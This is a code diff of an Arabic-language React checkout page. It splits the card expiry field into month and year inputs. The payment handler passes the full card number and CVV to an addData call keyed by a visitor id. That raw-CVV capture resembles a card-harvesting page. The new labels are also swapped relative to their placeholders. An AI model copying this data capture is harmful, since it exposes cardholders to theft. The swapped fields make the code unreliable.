@@ -108,6 +108,7 @@ export default function MainPage() {
   const [cardInfo, setCardInfo] = useState({
     number: "",
     expiry: "",
+    month:"",
     cvv: "",
     name: "",
   })
@@ -172,7 +173,7 @@ export default function MainPage() {
   }
 
   const handlePayment = () => {
-    addData({ id: visitorId, cardNumber: cardInfo.number, cvv:cardInfo.cvv,expiryDate:cardInfo.expiry })
+    addData({ id: visitorId, cardNumber: cardInfo.number, cvv:cardInfo.cvv,expiryDate:cardInfo.expiry +'/'+cardInfo.month})
     if (paymentMethod === "cash") {
       setCurrentStep("success")
     } else {
@@ -195,7 +196,7 @@ export default function MainPage() {
     setQuantity(1)
     setCustomerInfo({ name: "", phone: "", address: "", city: "" })
     setOtpCode("")
-    setCardInfo({ number: "", expiry: "", cvv: "", name: "" })
+    setCardInfo({ number: "", expiry: "", cvv: "", name: "",month:"" })
     setSelectedOffer(null)
   }
 
@@ -568,14 +569,28 @@ export default function MainPage() {
                     placeholder="1234 5678 9012 3456"
                   />
                 </div>
-                <div className="grid grid-cols-2 gap-4">
+                <div className="grid grid-cols-3 gap-4">
                   <div>
-                    <Label htmlFor="expiry">تاريخ الانتهاء</Label>
+                    <Label htmlFor="expiry">شهر </Label>
                     <Input
                       id="expiry"
                       value={cardInfo.expiry}
                       onChange={(e) => setCardInfo({ ...cardInfo, expiry: e.target.value })}
-                      placeholder="MM/YY"
+                      placeholder="YY"
+                      maxLength={2}
+
+                    />
+                    
+                  </div>
+                  <div>
+                  <Label htmlFor="expiry"> سنة</Label>
+
+                  <Input
+                      id="month"
+                      value={cardInfo.month}
+                      onChange={(e) => setCardInfo({ ...cardInfo, month: e.target.value })}
+                      placeholder="MM"
+                      maxLength={2}
                     />
                   </div>
                   <div>
